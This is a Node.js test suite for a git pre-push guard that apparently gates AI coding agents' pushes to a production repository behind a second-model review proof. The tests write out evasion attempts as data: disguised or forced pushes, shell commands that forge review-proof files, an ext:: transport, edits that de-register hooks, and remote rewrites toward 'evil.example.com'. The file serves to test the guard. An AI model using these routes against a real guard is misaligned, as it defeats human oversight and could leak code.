#!/usr/bin/env node

import assert from "node:assert/strict";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

import { scratchHookEnvironment } from "./git-test-env.mjs";
import {
  claudeProofValid,
  contentIsRisky,
  describeRiskyContent,
  riskyContentMatches,
  unquoteGitPath,
  gitPushCwd,
  gitSubcommandIsDynamic,
  mainPushIsForced,
  mainPushSource,
  pushIsForced,
  isGitPush,
  pushUsesExecPathOption,
  executableTransportSettings,
  urlUsesUnknownTransport,
  environmentSelectsDifferentRepo,
  eachPush,
  pushNamesRemoteProgram,
  pushHiddenByShellComposition,
  pushContextIsAmbiguous,
  pushTargetsCurrentHead,
  pushUsesBulkMode,
  reviewProofPathMentioned,
  reviewStateDirectoryMentioned,
  extractPatchDestinations,
  proofValid,
  repoIsGuardedApp,
  urlIsGuardedApp,
  pushUsesTransportEnv,
  environmentCarriesTransportOverride,
  pushDestinationToken,
  pushNamesRefspec,
  pushDefaultConsultsBranchMerge,
  destinationLooksLikeUrl,
  pushUsesInlineConfig,
  pushUsesConfigEnv,
  pushUsesConfigRootEnv,
  pushSetsInlineEnv,
  shellSegments,
  unknownPushOptions,
  unknownGitGlobalOptions,
  environmentCarriesConfigOverride,
  rewritesReachGuardedApp,
  riskyFiles,
  pushDestinationDecisions,
  divergentPushLookups,
  configuredMirrorRemotes,
  pushDestinationLookupArgs,
} from "./codex-push-lib.mjs";

const now = Date.parse("2026-07-13T18:00:00.000Z");
const sha = "a".repeat(40);

assert.equal(mainPushSource("git push origin HEAD:main", "feature"), "HEAD");
assert.equal(gitSubcommandIsDynamic("$verb='push'; git $verb origin HEAD:main"), true, "PowerShell variable subcommand");
assert.equal(gitSubcommandIsDynamic("verb=push; git ${verb} origin HEAD:main"), true, "POSIX variable subcommand");
assert.equal(gitSubcommandIsDynamic("set verb=push && git %verb% origin HEAD:main"), true, "cmd variable subcommand");
assert.equal(gitSubcommandIsDynamic("git @args"), true, "PowerShell splatted arguments");
assert.equal(gitSubcommandIsDynamic("git p*sh origin HEAD:main"), true, "glob-expanded subcommand");
assert.equal(gitSubcommandIsDynamic("git -C /repo push origin main"), false, "literal push remains inspectable");
assert.equal(gitSubcommandIsDynamic("git status --short"), false, "literal non-push remains available");
assert.equal(gitSubcommandIsDynamic("echo '$verb'; npm test"), false, "a variable outside a Git subcommand is irrelevant");
for (const option of ["--no-optional-locks", "--paginate", "--bare", "--glob-pathspecs"]) {
  assert.deepEqual(
    unknownGitGlobalOptions(`git ${option} push origin HEAD:main`),
    [option], `${option} cannot hide a later push`,
  );
}
assert.deepEqual(unknownGitGlobalOptions("git -C /repo push origin main"), [], "supported -C remains inspectable");

// Reworked 2026-08-05 (Mason's call). Deriving "same repository" from URL text
// sprang a new leak every review round: an SSH re-spelling gap, a dropped port, a
// key/raw namespace collision, a lowercased path merging `Team/Repo` with
// `team/repo`, and an SSH login user that changed which account a relative path
// resolved under. The gate never needed that question. It needs one boolean — is
// this destination the guarded production repository. These cases pin the
// behaviour AND the reason each former leak stopped mattering.
{
  const APP_HTTPS = "https://github.com/masonwells1/CRX_Manager_V1.0.git";
  const APP_SCP = "git@github.com:masonwells1/CRX_Manager_V1.0.git";
  const APP_SSH_URL = "ssh://git@github.com/masonwells1/CRX_Manager_V1.0.git";
  const OTHER = "https://github.com/masonwells1/SomethingElse.git";
  const line = (url, name = "origin") => `${name}\t${url} (push)\n`;

  // Anchor: the decision is a real value, not vacuously identical everywhere.
  // Both halves are pinned — the gate classification AND the spelling key —
  // because an implementation that returned a constant would satisfy every
  // equal/notEqual assertion below on its own (CodeRabbit, 2026-08-05).
  assert.equal(
    pushDestinationDecisions(line(APP_HTTPS)),
    "origin guarded-app github github.com/masonwells1/crx_manager_v1.0",
  );
  assert.equal(
    pushDestinationDecisions(line(OTHER)),
    "origin unrelated github github.com/masonwells1/somethingelse",
  );

  // The regression this whole change exists for: a credential proxy re-spelling
  // the remote must not read as a redirect.
  for (const [label, spelling] of [["scp-style", APP_SCP], ["ssh://", APP_SSH_URL]]) {
    assert.equal(
      pushDestinationDecisions(line(spelling)), pushDestinationDecisions(line(APP_HTTPS)),
      `the ${label} spelling of the production repo is the same decision`,
    );
  }

  // A rewrite that turns an unrelated destination into production flips the
  // boolean and denies. This is the case the comparison exists to catch.
  assert.deepEqual(
    divergentPushLookups(
      { remotes: `ok:${pushDestinationDecisions(line(OTHER))}` },
      { remotes: `ok:${pushDestinationDecisions(line(APP_HTTPS))}` },
    ), ["remotes"], "an unrelated destination becoming production denies",
  );

  // Off GitHub nothing is normalised, so every one of these rewrites DENIES.
  // An earlier round of this change argued the opposite — that both sides being
  // unrelated meant no decision changed, so the differing text did not matter.
  // That was wrong twice over. A feature-branch push is not gated at all, so this
  // comparison is the ONLY thing standing between an inherited rewrite and the
  // objects landing somewhere else; and `urlIsGuardedApp` is path-only by design,
  // so the off-host case did not even reach the "both unrelated" branch — it read
  // as production on BOTH sides and sailed through. Verified against the real
  // guard, not just this function.
  for (const [label, before, after] of [
    // CodeRabbit, 2026-08-05: git paths are not universally case-insensitive.
    ["path case on a case-sensitive host", "https://git.example.com/Team/Repo.git", "https://git.example.com/team/repo.git"],
    // Codex, 2026-08-05: the scp form's user can select a different account/home.
    ["ssh login user", "alice@git.example.com:repo.git", "bob@git.example.com:repo.git"],
    ["non-default port", "https://git.example.com:8443/team/repo.git", "https://git.example.com/team/repo.git"],
    // Found by running the real guard: the path is the production repo's, so
    // `urlIsGuardedApp` says "production" for BOTH — only the host differs.
    ["host, with the production path kept", APP_HTTPS, "https://evil.example.com/masonwells1/CRX_Manager_V1.0"],
    ["a different repo on the same non-GitHub host", "https://git.example.com/team/a.git", "https://git.example.com/team/b.git"],
    // The GitHub carve-out is an allow-list of SPELLINGS, not "any URL whose path
    // canonicalises under github.com". Keying on the canonical id alone let these
    // through: `canonicalRepoId` reads `URL.hostname` (no port) and ignores the
    // scheme entirely, so an endpoint change or a transport downgrade ON GitHub
    // compared equal. The non-GitHub port case above does not cover this path.
    // (CodeRabbit, 2026-08-05.)
    ["a non-default port on GitHub", APP_HTTPS, "https://github.com:8443/masonwells1/CRX_Manager_V1.0.git"],
    ["a downgrade to http on GitHub", APP_HTTPS, "http://github.com/masonwells1/CRX_Manager_V1.0.git"],
    ["a downgrade to the anonymous git protocol", APP_HTTPS, "git://github.com/masonwells1/CRX_Manager_V1.0.git"],
    // ssh.github.com is GitHub only on its documented port-443 endpoint.
    ["ssh.github.com on a port GitHub does not serve", "ssh://git@ssh.github.com:443/masonwells1/CRX_Manager_V1.0.git", "ssh://git@ssh.github.com:22/masonwells1/CRX_Manager_V1.0.git"],
    // GitHub accepts only the `git` SSH user; anything else is someone else's host.
    ["a non-git SSH user on GitHub", APP_SCP, "mallory@github.com:masonwells1/CRX_Manager_V1.0.git"],
  ]) {
    assert.deepEqual(
      divergentPushLookups(
        { remotes: `ok:${pushDestinationDecisions(line(before))}` },
        { remotes: `ok:${pushDestinationDecisions(line(after))}` },
      ), ["remotes"], `${label}: an inherited rewrite that changes this must deny`,
    );
  }
  // ...while the same variations ON the guarded repo still classify as
  // production, so the gate cannot be spelled around.
  for (const [label, url] of [
    ["mixed case", "https://GitHub.com/MasonWells1/CRX_Manager_V1.0.git"],
    ["explicit default port", "https://github.com:443/masonwells1/CRX_Manager_V1.0.git"],
    ["GitHub's port-443 ssh host", "ssh://git@ssh.github.com:443/masonwells1/CRX_Manager_V1.0.git"],
    ["no .git suffix", "https://github.com/masonwells1/CRX_Manager_V1.0"],
  ]) {
    // The CLASSIFICATION is what these pin; the spelling key rides along and is
    // asserted exactly by the anchor above.
    assert.match(pushDestinationDecisions(line(url)), /^origin guarded-app /, `${label} is still production`);
  }

  // Fails CLOSED: an unreadable or absent destination reads as production.
  assert.match(pushDestinationDecisions("origin\t (push)\n"), /^origin guarded-app /, "an empty destination gates");
  assert.match(
    pushDestinationDecisions(line("ext::ssh git@github.com %S masonwells1/CRX_Manager_V1.0.git")),
    /^origin guarded-app /, "remote-helper syntax gates rather than reading as unrelated",
  );

  // Only push lines participate, and remote ordering is not a change.
  assert.equal(
    pushDestinationDecisions(`origin\t${OTHER} (fetch)\n${line(APP_HTTPS)}`),
    pushDestinationDecisions(line(APP_HTTPS)), "the fetch line does not participate",
  );
  assert.equal(
    pushDestinationDecisions(line(APP_HTTPS, "a") + line(OTHER, "b")),
    pushDestinationDecisions(line(OTHER, "b") + line(APP_HTTPS, "a")), "remote ordering is not a change",
  );
  // The remote NAME still matters: a bare push picks its destination by name.
  assert.notEqual(
    pushDestinationDecisions(line(APP_HTTPS, "origin")),
    pushDestinationDecisions(line(APP_HTTPS, "upstream")), "a renamed remote is not silently equated",
  );
}
assert.deepEqual(unknownGitGlobalOptions("git --no-pager push origin main"), [], "supported --no-pager remains inspectable");
assert.deepEqual(unknownGitGlobalOptions("git --no-optional-locks status"), [], "an option before a non-push is outside this gate");
assert.equal(mainPushSource("git.exe push origin HEAD:main", "feature"), "HEAD");
assert.equal(mainPushSource('"C:\\Program Files\\Git\\cmd\\git.exe" push origin HEAD:main', "feature"), "HEAD");
assert.equal(mainPushSource("/usr/bin/git push origin HEAD:main", "feature"), "HEAD");
assert.equal(mainPushSource("git -C ../repo push origin release:main", "feature"), "release");
assert.equal(mainPushSource("git push origin :main", "feature"), "DELETE");
assert.equal(mainPushSource("git push origin feature", "feature"), null);
assert.equal(pushTargetsCurrentHead("git push -u origin feature", "feature"), true);
assert.equal(pushTargetsCurrentHead("git push origin feature:feature", "FEATURE"), true);
assert.equal(pushTargetsCurrentHead("git push origin refs/heads/FEATURE:refs/heads/feature", "refs/heads/feature"), true);
assert.equal(pushTargetsCurrentHead("git push origin HEAD:feature", "feature"), true);
assert.equal(pushTargetsCurrentHead("git push origin HEAD:production", "feature"), false);
assert.equal(pushTargetsCurrentHead("git push origin feature:factory-result", "feature"), false);
assert.equal(pushTargetsCurrentHead("git push upstream HEAD:feature", "feature"), false);
assert.equal(pushTargetsCurrentHead("git push origin", "feature"), false);
assert.equal(pushTargetsCurrentHead("git push origin HEAD:main", "main"), false);
assert.equal(pushTargetsCurrentHead("git push origin release:factory-result", "feature"), false);
assert.equal(pushTargetsCurrentHead("git push origin feature other", "feature"), false);
assert.equal(pushTargetsCurrentHead("git push origin :factory-result", "feature"), false);
assert.equal(mainPushSource("git push --all origin", "feature"), "main");
assert.equal(mainPushSource("git push origin --branches", "feature"), "main");
assert.equal(mainPushSource("git push --mirror origin", "feature"), "main");

// Codex round-2 (2026-07-13): option-based deletion of main.
assert.equal(mainPushSource("git push origin --delete main", "feature"), "DELETE");
assert.equal(mainPushSource("git push origin -d main", "feature"), "DELETE");
assert.equal(mainPushSource("git push origin --del main", "feature"), "DELETE");
assert.equal(mainPushSource("git push --delete origin main", "feature"), "DELETE");
assert.equal(mainPushSource("git push origin --delete feature/test", "feature"), null);

assert.equal(mainPushIsForced("git push origin main --force", "feature"), true);
assert.equal(mainPushIsForced("git push origin main -f", "feature"), true);
assert.equal(mainPushIsForced("git push origin main --force-with-lease", "feature"), true);
assert.equal(mainPushIsForced("git push origin main --force-with-lease=refs/heads/main:abc", "feature"), true);
assert.equal(mainPushIsForced("git push origin +HEAD:main", "feature"), true);
assert.equal(mainPushIsForced("git push origin \"+HEAD:main\"", "feature"), true);
assert.equal(mainPushIsForced("git -C . push --force origin main", "feature"), true);
assert.equal(mainPushIsForced("git push -uf origin main", "feature"), true);
assert.equal(mainPushIsForced("git push origin feature --force", "feature"), false);
assert.equal(mainPushIsForced("git push origin HEAD:main", "feature"), false);
assert.equal(pushIsForced("git push origin feature --force", "feature"), true);
assert.equal(pushIsForced("git push --all origin --force", "feature"), true);
assert.equal(pushIsForced("git push origin --all -f", "feature"), true);
assert.equal(pushIsForced("git push origin +feature", "feature"), true);
assert.equal(pushIsForced("git push origin feature", "feature"), false);
assert.equal(pushUsesBulkMode("git push --all origin"), true);
assert.equal(pushUsesBulkMode("git push origin --branches"), true);
assert.equal(pushUsesBulkMode("git push origin --mirror"), true);
assert.equal(pushUsesBulkMode("git push origin --prune"), true);
assert.equal(pushUsesBulkMode("git push origin feature"), false);
assert.equal(pushContextIsAmbiguous("cd C:/other && git push origin main"), true);
assert.equal(pushContextIsAmbiguous("Set-Location C:/other; git.exe push origin main"), true);
assert.equal(pushContextIsAmbiguous("$env:GIT_DIR='C:/other/.git'; git push origin main"), true);
assert.equal(pushContextIsAmbiguous("GIT_WORK_TREE=/tmp/other git push origin main"), true);
assert.equal(pushContextIsAmbiguous("git -C C:/other push origin main"), false);
assert.equal(reviewProofPathMentioned(".claude/session-state/claude-review-push.json"), true);
assert.equal(reviewProofPathMentioned("C:\\repo\\.claude\\session-state\\codex-review-abc.json"), true);
assert.equal(reviewProofPathMentioned("printf {} > codex-review-forged.json"), true);
assert.equal(reviewProofPathMentioned("printf {} >claude-review-push.json"), true);
assert.equal(reviewProofPathMentioned("rm codex-review-x.json;ls"), true);
assert.equal(reviewProofPathMentioned("cat claude-review-push.json|more"), true);
assert.equal(reviewProofPathMentioned("rm codex-review-x.json)"), true);
assert.equal(reviewProofPathMentioned("Remove-Item a.json,claude-review-push.json"), true);
assert.equal(reviewProofPathMentioned("copy forged.json claude-review-push.json>nul"), true);
assert.equal(reviewProofPathMentioned("my-claude-review-push.json.bak"), false);
assert.equal(reviewProofPathMentioned(".claude/session-state/claude-review-latest.txt"), false);
assert.equal(reviewStateDirectoryMentioned("cd .claude/session-state"), true);
assert.equal(reviewStateDirectoryMentioned("cd .claude && cd session-state"), true);
assert.equal(reviewStateDirectoryMentioned("cd .claude"), true);
assert.equal(reviewStateDirectoryMentioned("C:\\repo\\.claude\\session-state"), true);

// Codex round-4 (2026-07-13): abbreviated bulk options count as bulk mode.
assert.equal(pushUsesBulkMode("git push origin --mirr"), true);
assert.equal(pushUsesBulkMode("git push origin --al"), true);
assert.equal(pushUsesBulkMode("git push origin --pru"), true);
assert.equal(pushUsesBulkMode("git push origin --bran"), true);
assert.equal(pushUsesBulkMode("git push origin --tags"), false, "--tags is not a bulk-ref mode");
assert.equal(pushUsesBulkMode("git push origin feature"), false);

// Codex round-2 (2026-07-13): unambiguous long-option abbreviations count as force.
assert.equal(mainPushIsForced("git push origin main --force-w", "feature"), true);
assert.equal(mainPushIsForced("git push origin main --force-with", "feature"), true);
assert.equal(mainPushIsForced("git push origin main --force-if", "feature"), true);
assert.equal(mainPushIsForced("git push origin main --follow-tags", "feature"), false, "--follow-tags is not force intent");

assert.equal(gitPushCwd("git -C ../repo push origin HEAD:main", "C:/work/current"), path.resolve("C:/work/repo"));
assert.equal(gitPushCwd("git -C .. -C sibling push origin HEAD:main", "C:/work/current"), path.resolve("C:/work/sibling"));

assert.deepEqual(riskyFiles(["src/pages/Home.tsx", "supabase/migrations/1.sql"]), ["supabase/migrations/1.sql"]);
const maintenanceProducerPath = "scripts/apply-live-testdata-" + "maintenance-20260812.mjs";
assert.deepEqual(
  riskyFiles([maintenanceProducerPath]),
  [maintenanceProducerPath],
  "the protected maintenance producer always requires exact-head review",
);
// Codex round-7 (PR #142): reviewer charters + the proof-minting wrapper are
// gate machinery — editing them must itself require the second-model verdict.
assert.deepEqual(riskyFiles([".claude/agents/rls-security-reviewer.md"]), [".claude/agents/rls-security-reviewer.md"]);
assert.deepEqual(riskyFiles(["scripts/write-apply-proofs.mjs"]), ["scripts/write-apply-proofs.mjs"]);
assert.deepEqual(riskyFiles(["scripts/overnight-codex-gate.mjs"]), ["scripts/overnight-codex-gate.mjs"]);
assert.deepEqual(
  riskyFiles(["package.json"]),
  ["package.json"],
  "package.json test wiring always requires Sol/high review",
);
// Codex round-8 (PR #142): the hook-registration surfaces — a PR that
// de-registers a guard by editing only these must still require the verdict.
assert.deepEqual(riskyFiles([".claude/settings.json"]), [".claude/settings.json"]);
assert.deepEqual(riskyFiles([".codex/hooks.json"]), [".codex/hooks.json"]);
assert.deepEqual(
  riskyFiles([
    "src/pages/Home.tsx",
    ".claude/hooks/codex-push-lib.mjs",
    ".codex/hooks/production-action-guard.mjs",
    ".github/workflows/ci.yml",
    ".husky/pre-push",
    "scripts/run-claude-review.mjs",
    "scripts/write-codex-push-proof.mjs",
  ]),
  [
    ".claude/hooks/codex-push-lib.mjs",
    ".codex/hooks/production-action-guard.mjs",
    ".github/workflows/ci.yml",
    ".husky/pre-push",
    "scripts/run-claude-review.mjs",
    "scripts/write-codex-push-proof.mjs",
  ],
  "guardrail and CI self-modifications always require second-model review",
);
// The sole Codex-proof producer must itself be risky: a later edit to it cannot
// slip to main without an independent second-model review of that edit.
assert.deepEqual(riskyFiles(["scripts/write-codex-push-proof.mjs"]), ["scripts/write-codex-push-proof.mjs"]);
// The sanctioned C3 ledger-mutation script is guard machinery: weakening its
// --i-verified-against-live gate must itself require the second-model verdict
// (Opus review 2026-08-19, round 3).
assert.deepEqual(riskyFiles(["scripts/remove-applied-ledger-entry.mjs"]), ["scripts/remove-applied-ledger-entry.mjs"]);
assert.equal(contentIsRisky("+ const total_cents = 100"), true);
assert.equal(contentIsRisky("+ const title = 'ordinary'"), false);

// ── risky-content REPORTING (diagnosis only — the verdict must not move) ─────
// The guards used to blame a fixed list of four identifiers (`_cents`,
// `financial_audit_log`, `allocate_payment`, `apply_prepay`) for every
// content-flagged diff. The pattern has ~20 alternatives, so on PR #456 the
// message blamed `_cents` while `policy`, `grant`, `.update(` and `.delete(`
// were also matching — removing `_cents` would have changed nothing. These
// tests pin the reporter to the SAME regex and, above all, pin that adding it
// did not move the gate.

// 1. THE REGRESSION GUARD. `describeRiskyContent` is diagnosis; it must never
//    disagree with `contentIsRisky`. If a future edit narrows one and not the
//    other, this fails. Corpus spans every branch of the alternation plus
//    negatives.
for (const [sample, expected] of [
  ["+ const total_cents = 100", true],
  ["+ insert into financial_audit_log values (1)", true],
  ["+ select allocate_payment(1)", true],
  ["+ select apply_prepay(1)", true],
  ["+ where owner = auth.uid()", true],
  ["+ create function f() security definer as $$", true],
  ["+ -- tighten the rls policy here", true],
  ["+ grant execute on function f to authenticated", true],
  ["+ if (is_admin()) { return; }", true],
  ["+ await supabase.from('t').update({ a: 1 })", true],
  ["+ const status = 'draft'", true],
  ["+ inventory levels look fine", true],
  ["+ const title = 'ordinary'", false],
  ["+ // just a comment about nothing", false],
  ["", false],
]) {
  assert.equal(contentIsRisky(sample), expected, `contentIsRisky: ${sample}`);
  assert.equal(
    riskyContentMatches(sample).length > 0,
    expected,
    `reporter agrees with the gate: ${sample}`,
  );
}

// 2. Per-file attribution, and the count. This is the whole point: name the
//    file and the token, not a hard-coded guess.
{
  const diff = [
    "diff --git a/a.yaml b/a.yaml",
    "+++ b/a.yaml",
    "+  # the review policy for grant handling",
    "+  await x.update({})",
    "diff --git a/b.md b/b.md",
    "+++ b/b.md",
    "+  policy, policy, and more policy",
  ].join("\n");
  const found = riskyContentMatches(diff);
  assert.deepEqual(found.map((f) => f.file), ["a.yaml", "b.md"]);
  const bTokens = found[1].tokens;
  assert.equal(bTokens[0].token, "policy");
  assert.equal(bTokens[0].count, 3, "repeat matches on one line are all counted");
  const aTokens = found[0].tokens.map((t) => t.token).sort();
  assert.deepEqual(aTokens, [".update(", "grant", "policy"]);
  const text = describeRiskyContent(diff);
  assert.match(text, /a\.yaml:/);
  assert.match(text, /policy x3/, "counts are surfaced, not just the token");
}

// 3. A match that exists ONLY in the file PATH. `docs/policy.md` makes
//    contentIsRisky true through the `+++ b/` header alone. A reporter that
//    consumed headers without scanning them would answer "nothing matched"
//    while the gate said risky — a contradiction that reads as a broken guard.
{
  const diff = ["diff --git a/docs/policy.md b/docs/policy.md", "+++ b/docs/policy.md", "+ nothing notable here"].join("\n");
  assert.equal(contentIsRisky(diff), true);
  const found = riskyContentMatches(diff);
  assert.ok(found.length > 0, "a path-only match is still attributed, not dropped");
  assert.equal(found[0].file, "docs/policy.md");
}

// 4. Fail-safe wording. With no matches the description must still read as a
//    denial reason, never as "nothing matched" (which would invite a bypass).
{
  const generic = describeRiskyContent("");
  assert.match(generic, /matches a money\/security pattern/);
  assert.doesNotMatch(generic, /nothing|no match/i);
}

// 5. Caps. A huge diff must not produce an unbounded wall of text.
{
  const many = Array.from({ length: 40 }, (_, i) =>
    [`+++ b/file${i}.md`, "+ policy"].join("\n")).join("\n");
  const text = describeRiskyContent(many);
  assert.match(text, /more file\(s\)/, "overflow is summarised, not printed in full");
  assert.ok(text.split(/\r?\n/).length < 15, "capped output stays readable");
}

// 5b. QUOTED patch paths. Git C-quotes a path holding a control character, a
//     quote, a backslash or a non-ASCII byte. A parser that knows only the bare
//     form leaves currentFile on the PREVIOUS file, so the denial names a file
//     that never held the token. (CodeRabbit, PR #463.)
{
  assert.equal(unquoteGitPath('"a/docs/policy\\treview.md"'), "a/docs/policy\treview.md");
  assert.equal(unquoteGitPath('"b/docs/quote\\"review.md"'), 'b/docs/quote"review.md');
  assert.equal(unquoteGitPath("b/docs/plain.md"), "b/docs/plain.md", "bare paths pass through untouched");
  // Octal escapes are UTF-8 BYTES; decoding per byte would mojibake. "é" is C3 A9.
  assert.equal(unquoteGitPath('"a/caf\\303\\251.md"'), "a/café.md");

  const diff = [
    "diff --git a/src/ordinary.ts b/src/ordinary.ts",
    "+++ b/src/ordinary.ts",
    "+ const untouched = 1;",
    'diff --git "a/docs/policy\treview.md" "b/docs/policy\treview.md"',
    '+++ "b/docs/policy\treview.md"',
    "+ nothing notable",
  ].join("\n");
  const files = riskyContentMatches(diff).map((f) => f.file);
  assert.ok(
    files.includes("docs/policy\treview.md"),
    `quoted path is attributed to itself, got ${JSON.stringify(files)}`,
  );
  assert.ok(
    !files.includes("src/ordinary.ts"),
    "the innocent PREVIOUS file is not blamed for the quoted file's token",
  );
}

// 5c. RENAME attribution. `docs/policy.md` -> `docs/ordinary.md` fires the gate
//     on `policy`, but the token lives only in the SOURCE name. Blaming the
//     destination sends the operator to a file that never contained it — the
//     exact misdirection this reporter exists to remove. A pure rename emits no
//     `---`/`+++` pair, only `rename from`/`rename to`. (CodeRabbit, PR #463.)
{
  const diff = [
    "diff --git a/docs/policy.md b/docs/ordinary.md",
    "similarity index 100%",
    "rename from docs/policy.md",
    "rename to docs/ordinary.md",
  ].join("\n");
  assert.equal(contentIsRisky(diff), true);
  const found = riskyContentMatches(diff);
  const blamed = found.map((f) => f.file);
  assert.deepEqual(blamed, ["docs/policy.md"], "only the source path is blamed for a source-path token");
  assert.equal(found[0].tokens[0].token, "policy");
  assert.equal(
    found[0].tokens[0].count,
    1,
    "a path repeated across diff --git + rename lines counts ONCE, not per header line",
  );
}

// 6. The reporter is built from RISKY_CONTENT_RE.source, never a copy. Proven
//    behaviourally: every token the reporter returns must itself re-trigger the
//    gate. A hand-maintained second pattern would drift and fail this.
for (const { tokens } of riskyContentMatches("+++ b/x.ts\n+ const total_cents = 1; await a.update({}); -- rls policy")) {
  for (const { token } of tokens) {
    assert.equal(contentIsRisky(token), true, `reported token re-triggers the gate: ${token}`);
  }
}

// 2026-07-29: the risky-file gate reasons about THIS app's migrations, RLS and
// money code, so it only applies to THIS repo. It used to run against any repo
// the session pushed to, and blocked a backup snapshot because a markdown note
// was named `project_policy-grantee-...` (the `/policy|grant/i` pattern is
// unanchored). Scope by remote URL; do NOT weaken the patterns.
assert.equal(repoIsGuardedApp("origin\tgit@github.com:masonwells1/CRX_Manager_V1.0.git (push)"), true);
assert.equal(repoIsGuardedApp("origin\thttps://github.com/masonwells1/CRX_Manager_V1.0 (push)"), true);
assert.equal(repoIsGuardedApp("origin\tgit@github.com:masonwells1/CRX_Backups.git (push)"), false);
assert.equal(repoIsGuardedApp("origin\tgit@github.com:masonwells1/FarmRx.git (push)"), false);
// A second remote pointing at the app repo still gates the push.
assert.equal(
  repoIsGuardedApp("backup\tgit@github.com:masonwells1/CRX_Backups.git (push)\norigin\tgit@github.com:masonwells1/CRX_Manager_V1.0.git (push)"),
  true,
);
// Fails CLOSED: an empty/unreadable remote list must gate, never wave through.
assert.equal(repoIsGuardedApp(""), true);
assert.equal(repoIsGuardedApp(null), true);
assert.equal(repoIsGuardedApp(undefined), true);
// A look-alike repo name must NOT be mistaken for the real one.
assert.equal(repoIsGuardedApp("origin\tgit@github.com:someoneelse/CRX_Manager_V1.0.git (push)"), false);
assert.equal(repoIsGuardedApp("origin\tgit@github.com:masonwells1/CRX_Manager_V1.0_fork.git (push)"), false);

// 2026-07-30 (Codex pre-push review): scoping by CONFIGURED remotes alone is a
// bypass — a push can name the app repo's URL directly from a checkout whose
// configured remote is something unrelated. The destination must be classified
// on its own, and it too fails CLOSED.
assert.equal(urlIsGuardedApp("git@github.com:masonwells1/CRX_Manager_V1.0.git"), true);
assert.equal(urlIsGuardedApp("https://github.com/masonwells1/CRX_Manager_V1.0"), true);
assert.equal(urlIsGuardedApp("https://github.com/masonwells1/CRX_Manager_V1.0/"), true, "trailing slash still matches");
assert.equal(urlIsGuardedApp("git@github.com:masonwells1/CRX_Backups.git"), false);
assert.equal(urlIsGuardedApp("git@github.com:someoneelse/CRX_Manager_V1.0.git"), false);
assert.equal(urlIsGuardedApp(""), true, "unresolvable destination gates");
assert.equal(urlIsGuardedApp(null), true);
assert.equal(urlIsGuardedApp(undefined), true);

// Round 9: repository IDENTITY, not string shape. Every form below is the
// production repo as far as git and any URL parser are concerned; the old suffix
// match saw an unrelated repo and skipped the gate.
assert.equal(
  urlIsGuardedApp("https://github.com/masonwells1/./CRX_Manager_V1.0.git"), true,
  "a `.` segment still resolves to the app repo",
);
assert.equal(
  urlIsGuardedApp("https://github.com/masonwells1/other/../CRX_Manager_V1.0.git"), true,
  "a `..` segment still resolves to the app repo",
);
assert.equal(
  urlIsGuardedApp("https://github.com//masonwells1//CRX_Manager_V1.0.git"), true,
  "doubled separators still resolve to the app repo",
);
assert.equal(
  urlIsGuardedApp("https://GitHub.com/MasonWells1/crx_manager_v1.0.git"), true,
  "host, owner and repo compare case-insensitively",
);
assert.equal(
  urlIsGuardedApp("https://token@github.com/masonwells1/CRX_Manager_V1.0.git"), true,
  "embedded credentials do not change which repo it is",
);
assert.equal(
  urlIsGuardedApp("ssh://git@github.com/masonwells1/CRX_Manager_V1.0.git"), true,
  "the ssh:// spelling is the same repo",
);
// Round 11: GitHub's documented port-443 SSH endpoint, for networks that block
// port 22. Same repository, different hostname — on host name alone it read as
// somewhere unrelated and the proof gate was skipped.
assert.equal(
  urlIsGuardedApp("ssh://git@ssh.github.com:443/masonwells1/CRX_Manager_V1.0.git"), true,
  "the port-443 ssh endpoint is the same repo",
);
assert.equal(
  urlIsGuardedApp("git@ssh.github.com:masonwells1/CRX_Manager_V1.0.git"), true,
  "and its scp-like spelling",
);
assert.equal(
  urlIsGuardedApp("https://www.github.com/masonwells1/CRX_Manager_V1.0.git"), true,
  "so is the www host",
);
assert.equal(
  urlIsGuardedApp("ssh://git@ssh.github.com:443/masonwells1/CRX_Backups.git"), false,
  "the alias does not make every repo on that host the app repo",
);
assert.equal(
  urlIsGuardedApp("https://github.com/masonwells1/CRX_Manager_V1.0.wiki.git"), false,
  "a different repo whose name merely starts the same is not the app repo",
);
// SUPERSEDED BY ROUND 16 (2026-07-30). This used to assert false, on the premise
// that the host name identifies the repository. Round 16 showed the premise is
// wrong: `github-crx:masonwells1/CRX_Manager_V1.0.git` is an ssh_config Host alias
// that git resolves to github.com, and an alias can be spelled with a dot as
// easily as without, so no host name can be trusted and no list of them can be
// complete. The guard now decides on the owner/repo path alone. The cost of that
// is this case — a hypothetical foreign host serving the same owner/repo path
// gets reviewed too. One extra review is the cheap side of the trade; the other
// side is an ungated push to the production app.
assert.equal(
  urlIsGuardedApp("https://example.com/masonwells1/CRX_Manager_V1.0.git"), true,
  "the app repo's owner/repo path is gated on any host, because a host name can be an alias",
);
assert.equal(
  urlIsGuardedApp("https://example.com/someoneelse/CRX_Manager_V1.0.git"), false,
  "but the gate is still scoped to this owner's repo, not to the name anywhere",
);
assert.equal(
  urlIsGuardedApp("https://[not-a-url"), true,
  "a destination that names a host but cannot be parsed fails CLOSED",
);
assert.equal(urlIsGuardedApp("origin"), false, "a bare remote name is resolved elsewhere");
assert.equal(
  urlIsGuardedApp("C:/Users/mason/scratch/dest.git"), false,
  "a local filesystem destination names no host",
);
assert.equal(
  repoIsGuardedApp("origin\thttps://github.com/masonwells1/./CRX_Manager_V1.0.git (push)"), true,
  "the checkout's remotes are canonicalized the same way",
);

// The destination token is the first non-option positional after `push`.
assert.equal(pushDestinationToken("git push origin main"), "origin");
assert.equal(pushDestinationToken("git -C /repo push origin HEAD:main"), "origin");
assert.equal(
  pushDestinationToken("git push git@github.com:masonwells1/CRX_Manager_V1.0.git HEAD:main"),
  "git@github.com:masonwells1/CRX_Manager_V1.0.git",
  "a direct URL destination is the one that matters",
);
assert.equal(pushDestinationToken("git push"), null, "no destination named — caller resolves git's default");
assert.equal(pushDestinationToken("git push -u origin main"), "origin");
// Options that consume the NEXT token must not be mistaken for the destination.
assert.equal(pushDestinationToken("git push -o ci.skip origin main"), "origin");
assert.equal(pushDestinationToken("git push --push-option=ci.skip origin main"), "origin");
assert.equal(pushDestinationToken("git push --receive-pack /usr/bin/rp origin main"), "origin");
// `--repo=<url>` and `--repo <url>` name the destination when no positional
// destination is present. A positional destination wins in the cases below.
assert.equal(pushDestinationToken("git push --repo=git@github.com:masonwells1/CRX_Manager_V1.0.git"), "git@github.com:masonwells1/CRX_Manager_V1.0.git");
assert.equal(pushDestinationToken("git push --repo git@github.com:masonwells1/CRX_Backups.git"), "git@github.com:masonwells1/CRX_Backups.git");

// A remote NAME can contain neither `:` nor a path separator, so anything that
